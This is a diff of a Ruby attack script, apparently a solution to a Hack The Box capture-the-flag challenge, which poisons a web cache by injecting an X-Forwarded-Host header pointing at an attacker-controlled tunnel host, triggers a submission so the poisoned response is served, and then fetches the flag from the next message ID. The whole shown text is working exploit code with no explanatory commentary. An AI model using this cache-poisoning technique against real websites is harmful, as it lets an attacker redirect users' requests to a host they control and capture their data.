@@ -2,8 +2,8 @@ require 'net/http'
 require 'uri'
 require 'json'
 
-HTB_URL = 'http://94.237.56.188:49475'
-ATTACKER_SERVER = '3bc911f136e4f2.lhr.life'
+HTB_URL = 'http://localhost:1337'
+ATTACKER_SERVER = 'e76fc69ce0b4cf.lhr.life'
 
 def get_id
   # If ID goes over, it should end at the last ID
@@ -34,6 +34,7 @@ def cache_poison
   if response.body.include?(headers['X-Forwarded-Host'])
     puts "Cached at #{next_id}"
   end
+  next_id
 end
 
 def submit
@@ -48,8 +49,20 @@ def submit
   response
 end
 
+def get_the_flag(message_id)
+  url = URI("#{HTB_URL}/message/#{message_id + 1}")
+  response = Net::HTTP.get(url)
+  json_response = JSON.parse(response)
+  p "??????????????????????"
+  p json_response
+  p "??????????????????????"
+end
+
 p "poisoning cache..."
-cache_poison()
+poisoned_message_id = cache_poison()
 
 p "trigger the attack..."
 submit()
+
+p "getting the flag..."
+get_the_flag(poisoned_message_id)
